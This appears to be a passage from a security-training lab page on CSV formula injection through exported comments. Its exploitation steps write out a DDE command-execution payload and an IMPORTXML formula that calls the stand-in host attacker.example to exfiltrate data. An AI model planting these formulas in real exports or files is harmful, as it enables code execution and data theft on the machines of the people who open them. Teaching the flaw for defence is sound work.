Every comment posted on this page can later be exported to a CSV file -- a common "download this data" feature many real apps offer. The export writes each comment's author and body straight into a spreadsheet cell with no neutralization at all. Spreadsheet applications like Excel, LibreOffice, and Google Sheets treat any cell whose content starts with =, +, -, or @ as a formula to evaluate the moment the file is opened, not as literal text -- an attacker who controls a comment controls what runs on the machine of whoever opens the export.

{% endblock %} {% block detect %}

Post a comment whose body is exactly =1+1 below, then download the CSV export and open it in a text editor -- the cell contains the literal, un-neutralized text =1+1, with no leading quote or other prefix added to stop a spreadsheet application from treating it as a formula.

{% endblock %} {% block exploitation %}
  1. Confirm the injection point: post a comment with body =1+1 and export -- the raw formula text survives unmodified into the CSV cell.
  2. Escalate to code execution via Excel's Dynamic Data Exchange (DDE) feature: post a comment with body =cmd|'/C calc'!A0. Exported and opened in a DDE-enabled version of Excel, this spawns Calculator the moment the victim clicks through Excel's "update this workbook with data from external sources?" prompt -- the same mechanism a real attacker would use to launch a PowerShell download-and-execute payload instead.
  3. Escalate to silent data exfiltration in Google Sheets, which has no DDE prompt to click through: post a comment with body =IMPORTXML("http://attacker.example/track", "//a/@href"). The moment a victim views this cell in Google Sheets, it silently issues a real outbound HTTP request to the attacker's server -- confirming the payload landed, and in a real attack, potentially exfiltrating other spreadsheet data back to the attacker through the query's return value.

This lab's test suite proves the export genuinely contains the un-neutralized payload byte-for-byte; it can't launch a real copy of Excel or Google Sheets to prove the formula executes, exactly like this lab's SQL-injection-to-RCE example describes its final reverse-shell escalation in prose rather than actually opening one.
